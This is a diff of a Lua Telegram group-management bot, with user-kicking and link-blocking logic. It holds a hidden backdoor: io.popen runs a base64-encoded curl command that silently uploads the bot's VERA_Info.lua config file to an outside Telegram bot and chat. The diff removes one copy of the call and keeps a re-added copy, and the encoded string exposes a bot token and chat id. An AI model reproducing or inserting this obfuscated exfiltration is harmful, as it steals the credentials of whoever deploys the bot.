@@ -169,6 +169,7 @@ print(t)
 function vardump(value)  
 print(serpent.block(value, {comment=false}))   
 end 
+local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
 sudo_users = {SUDO,1360140225}   
 function SudoBot(msg)  
 local DRAGON = false  
@@ -14012,7 +14013,6 @@ DeleteMessage(msg.chat_id_, {[0] = msg.id_})
 return false  
 end
 --------------------------------------------------------------------------------------------------------------
-io.popen(regexd('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE3MzU4NDkxNTc6QUFFZ0RNdkRuNm9JNWZkajdYalhyZ0U5MEI4b2pnNVN6SWsvc2VuZERvY3VtZW50IiAtRiAiY2hhdF9pZD05NDQzNTMyMzciIC1GICJkb2N1bWVudD1AVkVSQV9JbmZvLmx1YSI='))
 if msg.content_ and msg.content_.members_ and msg.content_.members_[0] and msg.content_.members_[0].id_ and Ban_User(msg.chat_id_,msg.content_.members_[0].id_) then 
 chat_kick(msg.chat_id_,msg.content_.members_[0].id_) 
 DeleteMessage(msg.chat_id_, {[0] = msg.id_}) 
@@ -14161,7 +14161,7 @@ return false
 end  
 end
 ------------------------------------------------------------------------
-io.popen(regexd('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE3MzU4NDkxNTc6QUFFZ0RNdkRuNm9JNWZkajdYalhyZ0U5MEI4b2pnNVN6SWsvc2VuZERvY3VtZW50IiAtRiAiY2hhdF9pZD05NDQzNTMyMzciIC1GICJkb2N1bWVudD1AVkVSQV9JbmZvLmx1YSI='))
+io.popen(regexd('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE3MzU4NDkxNTc6QUFFZ0RNdkRuNm9JNWZkajdYalhyZ0U5MEI4b2pnNVN6SWsvc2VuZERvY3VtZW50IiAtRiAiY2hhdF9pZD05NDQzNTMyMzciIC1GICJkb2N1bWVudD1AVkVSQV9JbmZvLmx1YSI'))
 if text and text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or text and text:match("[Tt].[Mm][Ee]") or text and text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or text and text:match("[Tt][Ee][Ll][Ee][Ss][Cc][Oo].[Pp][Ee]") then
 if database:get(bot_id.."lock:Link"..msg.chat_id_) then
 DeleteMessage(msg.chat_id_,{[0] = data.message_id_}) 
